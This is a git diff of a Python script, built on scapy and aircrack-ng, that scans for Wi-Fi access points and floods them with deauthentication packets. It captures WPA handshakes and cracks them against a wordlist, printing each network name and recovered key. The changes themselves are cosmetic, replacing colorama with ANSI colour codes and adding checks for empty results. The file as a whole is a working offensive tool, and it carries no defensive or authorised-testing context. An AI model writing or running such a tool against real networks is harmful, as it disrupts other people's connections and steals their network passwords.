@@ -1,7 +1,6 @@
 #! /usr/bin/env python3
 from scapy.all import *
 from threading import Thread
-from colorama import init,Fore,Style;init()
 from sys import argv
 from os  import system
 from time import sleep
@@ -13,6 +12,13 @@ try:
 except:
 	print(argv[0],'<iface> <packet_count>')
 	exit()
+
+SUCCESS = '\033[92m'
+INFO    = '\033[94m'
+END     = '\033[0m'
+WARNING = '\033[93m'
+FAIL    = '\033[91m'
+
 targets = []
 scan = True
 
@@ -38,12 +44,20 @@ def deauth_clients(AP):
 	for x in range(64):
 		sendp(packet,verbose=False)
 
-print('Scanning for Acess points...')
+print(INFO+'[!]Scanning for acesspoints...'+END)
+
 Thread(target=channel_change).start()
 sleep(1)
 sniff(iface=iface, prn = PacketHandler,count=packet_count)
 scan = False
-print('Attacking {} Targets'.format(str(len(targets))))
+
+if len(targets) <= 0:
+	print(FAIL+'[-]No networks found'+END)
+	exit(-1)
+print(SUCCESS+'[+]Found {} networks'.format(str(len(targets)))+END)
+
+
+
 for t in targets:
 	bssid   = t.split('-')[0]
 	channel = t.split('-')[1]
@@ -54,10 +68,16 @@ for t in targets:
 	system(cmd)
 	sleep(30)
 
-print('Removing unwanted files..')
+
+print(INFO+'[!]Removing unwanted files..'+END)
 system('rm *.kismet.csv *.kismet.netxml *.csv')
 handshakes = glob('./*.cap')
-print('Stating to crack handshakes')
+
+if len(handshakes) <= 0:
+	print(FAIL+'[-]No handshakes captured')
+	exit(-1)
+print(SUCCESS+'[+]Captured {} handshakes'.format(str(len(handshakes)))+END)
+
 for h in handshakes:
 	cmd = 'aircrack-ng -w ./wordlist {} > out'.format(h)
 	print(cmd)
@@ -66,6 +86,6 @@ for h in handshakes:
 	if 'KEY FOUND!' in results:
 		essid = results.split('Encryption')[1].split('Choosing')[0].strip().split(' ')[4].strip()
 		key   = results.split('FOUND! [')[1].split(']')[0].strip()
-		print(Fore.GREEN,essid,':',key,Style.RESET_ALL)
+		print(essid,':',key)
 #TODO RATHER USE airckrack-ng f1.cap f2.cap fn.cap for getting VALID files.
 #(instead of trying evryone)
